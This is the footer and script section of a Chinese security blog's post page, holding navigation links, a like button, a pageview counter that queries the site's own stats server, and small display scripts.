class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;ZLARYY123"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/essay/" rel="section"><i class="ic i-calendar"></i>essay</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2026/11/03/DC-2%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div><div id="player"></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/2026/03/27/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/09/05/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART4/">常规外网打点-PART4</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/16/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/08/04/%E5%B8%B8%E8%A7%84%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9-PART2/">常规外网打点-PART2</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/07/24/Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">Node.js原型链污染</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/02/22/SQL/">SQL</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/06/19/Linux%E6%8F%90%E6%9D%83/">Linux提权</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/09/22/Java-%E5%8F%8D%E5%B0%84/">Java-反射</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/09/27/PKWCTF%20AI%E6%96%B9%E5%90%91WP/">PKWCTF AI方向WP</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/2026/04/07/XXE/">XXE</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2></div></div><div class="status"><div class="copyright">&copy; 2022 -<span itemprop="copyrightYear">2026</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">ZLARYY @ ZLARYY</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">673k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">10:12</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+    ispost: true,
+    path: `2026/11/06/DC-3靶场日记/`,
+    favicon: {
+        show: `ZLARYY`,
+        hide: `ZLARYY`
+    },
+    search: {
+        placeholder: "文章搜索",
+        empty: "关于 「 ${query} 」，什么也没搜到",
+        stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    nocopy: "false",
+    copyright: `复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。`,
+    copy_tex: false,
+    katex: false,
+    mermaid: false,
+    audio: undefined,
+    nocopy: false,
+    outime: true,
+    template: `<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>`,
+    quiz: {
+        choice: `单选题`,
+        multiple: `多选题`,
+        true_false: `判断题`,
+        essay: `问答题`,
+        gap_fill: `填空题`,
+        mistake: `错题备注`
+    }
+};
+</script><script src="/js/siteInit.js?v=0.5.4" type="module" fetchpriority="high" defer></script><!-- hexo injector body_end start -->
+<script id="post-stats">
+(function () {
+  var API_NAME = 'ZLARYYPostStats';
+  var BOX_SELECTOR = '.post-stats-box';
+  var COUNT_LIMIT = 9999;
+
+  if (window[API_NAME] && typeof window[API_NAME].run === 'function') {
+    window[API_NAME].run();
+    return;
+  }
+
+  function isPostPage() {
+    return !!(window.LOCAL && window.LOCAL.ispost) || !!document.querySelector('article.post');
+  }
+
+  function storageKey(prefix) {
+    return prefix + window.location.pathname;
+  }
+
+  function getStorageValue(storage, key) {
+    try {
+      return storage.getItem(key);
+    } catch (error) {
+      return null;
+    }
+  }
+
+  function setStorageValue(storage, key, value) {
+    try {
+      storage.setItem(key, value);
+    } catch (error) {}
+  }
+
+  function removeStorageValue(storage, key) {
+    try {
+      storage.removeItem(key);
+    } catch (error) {}
+  }
+
+  function readCount(key) {
+    var raw = getStorageValue(window.localStorage, key);
+    var value = raw === null || raw === '' ? 0 : Number(raw);
+
+    if (!Number.isInteger(value) || value < 0 || value > COUNT_LIMIT) {
+      value = 0;
+      setStorageValue(window.localStorage, key, '0');
+    }
+
+    return value;
+  }
+
+  function writeCount(key, value) {
+    setStorageValue(window.localStorage, key, String(value));
+  }
+
+  function readLikeCount() {
+    return readCount(storageKey('zlaryy_like_count_'));
+  }
+
+  function hasLiked() {
+    return getStorageValue(window.localStorage, storageKey('zlaryy_liked_')) === '1';
+  }
+
+  function saveLikeState(count, liked) {
+    writeCount(storageKey('zlaryy_like_count_'), count);
+    if (liked) {
+      setStorageValue(window.localStorage, storageKey('zlaryy_liked_'), '1');
+    } else {
+      removeStorageValue(window.localStorage, storageKey('zlaryy_liked_'));
+    }
+  }
+
+  function clearRewardNodes() {
+    document.querySelectorAll('.reward').forEach(function (reward) {
+      reward.innerHTML = '';
+      reward.classList.add('post-stats-host');
+      reward.removeAttribute('style');
+      reward.setAttribute('aria-label', 'post stats');
+    });
+  }
+
+  function findInsertTarget() {
+    var reward = document.querySelector('article.post .reward, .reward');
+    if (reward) return { parent: reward, before: null };
+
+    var footer = document.querySelector('article.post > footer');
+    if (footer && footer.parentNode) return { parent: footer.parentNode, before: footer };
+
+    var article = document.querySelector('article.post');
+    if (article) return { parent: article, before: null };
+
+    return null;
+  }
+
+  function createStatsBox(viewCount, likeCount, liked) {
+    var box = document.createElement('div');
+    box.className = 'post-stats-box';
+    box.innerHTML = [
+      '<button class="post-view-count" type="button" disabled aria-disabled="true">',
+      '&#128065; &#x770b;&#x8fc7; <span class="zlaryy-pageview-count">' + viewCount + '</span> &#x6b21;',
+      '</button>',
+      '<button class="post-like-btn' + (liked ? ' liked' : '') + '" type="button" aria-pressed="' + (liked ? 'true' : 'false') + '">',
+      '<span class="post-like-label">' + (liked ? '&#x5df2;&#x70b9;&#x8d5e;' : '&#x70b9;&#x8d5e;') + '</span> ',
+      '<span class="local-like-count">' + likeCount + '</span>',
+      '</button>'
+    ].join('');
+
+    return box;
+  }
+
+  function updateLikeButton(button, count, liked) {
+    var labelNode = button.querySelector('.post-like-label');
+    var countNode = button.querySelector('.local-like-count');
+
+    if (labelNode) labelNode.textContent = liked ? '\u5df2\u70b9\u8d5e' : '\u70b9\u8d5e';
+    if (countNode) countNode.textContent = String(count);
+
+    button.classList.toggle('liked', liked);
+    button.setAttribute('aria-pressed', liked ? 'true' : 'false');
+  }
+
+  function bindLikeButton(box) {
+    var button = box.querySelector('.post-like-btn');
+    if (!button || button.dataset.bound === 'true') return;
+
+    updateLikeButton(button, readLikeCount(), hasLiked());
+
+    button.dataset.bound = 'true';
+    button.addEventListener('click', function () {
+      var count = readLikeCount();
+
+      if (hasLiked()) {
+        count = Math.max(0, count - 1);
+        saveLikeState(count, false);
+        updateLikeButton(button, count, false);
+        return;
+      }
+
+      if (count >= COUNT_LIMIT) count = 0;
+      count += 1;
+      saveLikeState(count, true);
+      updateLikeButton(button, count, true);
+    });
+  }
+
+  function renderStats() {
+    if (!isPostPage()) return;
+
+    clearRewardNodes();
+
+    var viewCount = '—';
+    var likeCount = readLikeCount();
+    var liked = hasLiked();
+    var box = document.querySelector(BOX_SELECTOR);
+
+    if (!box) {
+      var target = findInsertTarget();
+      if (!target) return;
+
+      box = createStatsBox(viewCount, likeCount, liked);
+      target.parent.insertBefore(box, target.before);
+    }
+
+    var likeNode = box.querySelector('.local-like-count');
+    var likeButton = box.querySelector('.post-like-btn');
+
+    if (likeNode) likeNode.textContent = String(likeCount);
+    if (likeButton) {
+      updateLikeButton(likeButton, likeCount, liked);
+    }
+
+    bindLikeButton(box);
+    document.dispatchEvent(new Event('zlaryy:stats-ready'));
+  }
+
+  function runPostStats() {
+    window.setTimeout(renderStats, 0);
+  }
+
+  window[API_NAME] = {
+    run: runPostStats
+  };
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', runPostStats);
+  } else {
+    runPostStats();
+  }
+
+  document.addEventListener('pjax:complete', runPostStats);
+})();
+</script>
+  
+<script>
+(function () {
+  function addBeian() {
+    const footerStatus = document.querySelector('#footer .status');
+    if (!footerStatus) return;
+
+    if (document.querySelector('.footer-beian')) return;
+
+    const beian = document.createElement('div');
+    beian.className = 'footer-beian';
+    beian.innerHTML = '<a href="https://beian.miit.gov.cn/" target="_blank" rel="noopener">蜀ICP备2026016552号-1</a>';
+
+    footerStatus.appendChild(beian);
+  }
+
+  addBeian();
+  document.addEventListener('pjax:complete', addBeian);
+})();
+</script>
+  <script id="zlaryy-article-views">(function articleViewsClient(options) {
+  if (window.ZLARYYArticleViews) {
+    window.ZLARYYArticleViews.refresh();
+    return;
+  }
+
+  var counts = new Map();
+  var recordedPath = null;
+  var requestId = 0;
+  var activeController = null;
+  var pendingPath = null;
+  var serverURL = (options.serverURL || '').replace(/\/+$/, '');
+
+  function normalPath(value) {
+    var url;
+    try {
+      url = new URL(value, window.location.href);
+      var siteOrigin = new URL(options.siteURL).origin;
+      if (url.origin !== window.location.origin && url.origin !== siteOrigin) return null;
+      return url.pathname.replace(/\/index\.html$/, '/').split('/').map(function (part) {
+        try {
+          return encodeURIComponent(decodeURIComponent(part).normalize('NFC'));
+        } catch (error) {
+          return part;
+        }
+      }).join('/');
+    } catch (error) {
+      return null;
+    }
+  }
+
+  function currentPath() {
+    var canonical = document.querySelector('link[rel="canonical"]');
+    return normalPath(canonical ? canonical.href : window.location.href);
+  }
+
+  function isPost() {
+    return !!(window.LOCAL && window.LOCAL.ispost) || !!document.querySelector('article.post');
+  }
+
+  function addCounter(meta, path, full) {
+    if (!meta || !path || meta.querySelector('.zlaryy-view-item')) return;
+    var item = document.createElement('span');
+    item.className = 'item zlaryy-view-item';
+    item.title = '累计浏览次数';
+    item.innerHTML =
+      '<span class="icon"><i class="ic i-eye"></i></span>' +
+      (full ? '<span class="text">浏览量</span>' : '') +
+      '<span class="zlaryy-pageview-count">—</span>' +
+      '<span class="text">次</span>';
+    item.querySelector('.zlaryy-pageview-count').dataset.path = path;
+    meta.appendChild(item);
+  }
+
+  function collectCounters() {
+    document.querySelectorAll('.segments article.item').forEach(function (card) {
+      var link = card.querySelector('.info h3 a[href]');
+      if (link) addCounter(card.querySelector('.info > .meta'), normalPath(link.href), false);
+    });
+    if (isPost()) {
+      var path = currentPath();
+      addCounter(document.querySelector('#header #brand .meta'), path, true);
+      document.querySelectorAll('article.post .post-view-count .zlaryy-pageview-count')
+        .forEach(function (element) { element.dataset.path = path; });
+    }
+    return Array.from(document.querySelectorAll('.zlaryy-pageview-count[data-path]'));
+  }
+
+  function render() {
+    collectCounters().forEach(function (element) {
+      var count = counts.get(element.dataset.path);
+      element.textContent = typeof count === 'number' ? String(count) : '—';
+      element.title = typeof count === 'number' ? '累计浏览次数' : '浏览量暂不可用';
+    });
+  }
+
+  async function counterRequest(query, body, signal) {
+    var url = new URL(serverURL + '/api/article');
+    url.searchParams.set('lang', 'zh-CN');
+    if (query) {
+      url.searchParams.set('path', query.join(','));
+      url.searchParams.set('type', 'time');
+    }
+    var response = await fetch(url.href, {
+      method: body ? 'POST' : 'GET',
+      headers: body ? { 'Content-Type': 'application/json' } : undefined,
+      body: body ? JSON.stringify(body) : undefined,
+      credentials: 'omit',
+      cache: 'no-store',
+      signal: signal
+    });
+    if (!response.ok) throw new Error('Counter HTTP ' + response.status);
+    var result = await response.json();
+    if (result.errno || !Array.isArray(result.data)) throw new Error('Invalid counter response');
+    return result.data;
+  }
+
+  function validCount(row) {
+    if (!row || !Number.isSafeInteger(row.time) || row.time < 0) {
+      throw new Error('Invalid pageview count');
+    }
+    return row.time;
+  }
+
+  async function refresh() {
+    var elements = collectCounters();
+    var path = currentPath();
+    var post = isPost();
+    render();
+    if (!post) recordedPath = null;
+    if (!serverURL || !elements.length || !path) return;
+    if (pendingPath === path) return;
+    pendingPath = path;
+
+    // Local previews only read totals; they must not increase the live counter.
+    var siteHost = new URL(options.siteURL).hostname;
+    var countVisit = post && (window.location.hostname === siteHost || options.countPreview);
+    var increment = countVisit && recordedPath !== path;
+    if (increment) recordedPath = path;
+
+    var paths = Array.from(new Set(elements.map(function (element) {
+      return element.dataset.path;
+    }))).filter(function (item) { return !increment || item !== path; });
+
+    var id = ++requestId;
+    if (activeController) activeController.abort();
+    var controller = new AbortController();
+    activeController = controller;
+    var timeout = window.setTimeout(function () { controller.abort(); }, 10000);
+    var jobs = [];
+
+    if (increment) {
+      jobs.push(counterRequest(null, { path: path, type: 'time', action: 'inc' }, controller.signal)
+        .then(function (rows) {
+          var count = validCount(rows[0]);
+          if (id === requestId) { counts.set(path, count); render(); }
+        }));
+    }
+    if (paths.length) {
+      jobs.push(counterRequest(paths, null, controller.signal).then(function (rows) {
+        if (rows.length !== paths.length) throw new Error('Incomplete counter response');
+        var values = rows.map(validCount);
+        if (id === requestId) {
+          paths.forEach(function (item, index) { counts.set(item, values[index]); });
+          render();
+        }
+      }));
+    }
+    try {
+      var results = await Promise.allSettled(jobs);
+      if (id === requestId && results.some(function (result) { return result.status === 'rejected'; })) {
+        console.warn('文章浏览量暂不可用。');
+      }
+    } finally {
+      window.clearTimeout(timeout);
+      if (id === requestId) { pendingPath = null; activeController = null; }
+    }
+  }
+
+  window.ZLARYYArticleViews = { refresh: refresh, render: render };
+  // The existing like button script creates its stats area after DOMContentLoaded.
+  document.addEventListener('zlaryy:stats-ready', render);
+  document.addEventListener('pjax:complete', function () { window.setTimeout(refresh, 0); });
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refresh, { once: true });
+  } else {
+    refresh();
+  }
+})({"enable":true,"serverURL":"https://zlaryy-waline.vercel.app","siteURL":"https://zlaryy.top","countPreview":false});</script><script>
+(function () {
+  function fixText(text) {
+    if (!text) return text;
+    text = text.replace(/\([`´]?Д[`´]?\)大変だ!/g, "ZLARYY");
+    text = text.replace(/大変だ!/g, "ZLARYY");
+    return text;
+  }
+
+  function replaceText(root) {
+    root = root || document.body;
+    if (!root) return;
+
+    var walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
+    var node;
+
+    while ((node = walker.nextNode())) {
+      var oldText = node.nodeValue;
+      var newText = fixText(oldText);
+      if (newText !== oldText) node.nodeValue = newText;
+    }
+  }
+
+  function init() {
+    replaceText(document.body);
+
+    var observer = new MutationObserver(function (mutations) {
+      mutations.forEach(function (mutation) {
+        mutation.addedNodes.forEach(function (node) {
+          if (node.nodeType === 1) {
+            replaceText(node);
+          } else if (node.nodeType === 3) {
+            node.nodeValue = fixText(node.nodeValue);
+          }
+        });
+      });
+    });
+
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+})();
+</script><!-- hexo injector body_end end --></body></html>
